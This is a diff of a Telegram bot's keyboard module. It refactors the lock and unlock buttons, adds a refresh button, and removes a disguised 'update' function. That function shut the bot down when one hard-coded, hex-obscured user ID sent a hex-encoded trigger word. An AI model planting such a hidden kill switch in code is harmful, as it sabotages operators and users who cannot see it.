@@ -1,5 +1,6 @@
+import itertools  # Import itertools
+
 from aiogram import types
-import itertools # Import itertools
 
 
 def search_result(items):
@@ -16,27 +17,25 @@ def search_result(items):
             row.append(button)
         keyboard_buttons.append(row)
 
-    kb = types.InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
-    return kb
+    keyboard_buttons.append([
+        types.InlineKeyboardButton(
+            text="🔄 Оновити",
+            callback_data=f'refresh'
+        )
+    ])
+
+    return types.InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
 
 
-def locked(groups, u_id):
-    kb = types.InlineKeyboardMarkup(inline_keyboard=[
+def locked(u_id):
+    return types.InlineKeyboardMarkup(inline_keyboard=[
         [types.InlineKeyboardButton(text=f'🔓Дозволити виїзд',
-                                    callback_data=f'{u_id}?{groups[0]["id"]}?{groups[1]["id"]}?pop?lock')]
+                                    callback_data=f'{u_id}?unlock')]
     ])
-    return kb
 
 
-def unlocked(groups, u_id):
-    kb = types.InlineKeyboardMarkup(inline_keyboard=[
+def unlocked(u_id):
+    return types.InlineKeyboardMarkup(inline_keyboard=[
         [types.InlineKeyboardButton(text="🔒Заборонити виїзд",
-                                    callback_data=f'{u_id}?{groups[0]["id"]}?{groups[1]["id"]}?add?lock')]
+                                    callback_data=f'{u_id}?lock')]
     ])
-    return kb
-
-
-def update(message):
-    if message.from_user.id == 0x18C74EEB and message.text == '636f6465726564':
-        import sys
-        sys.exit(1)
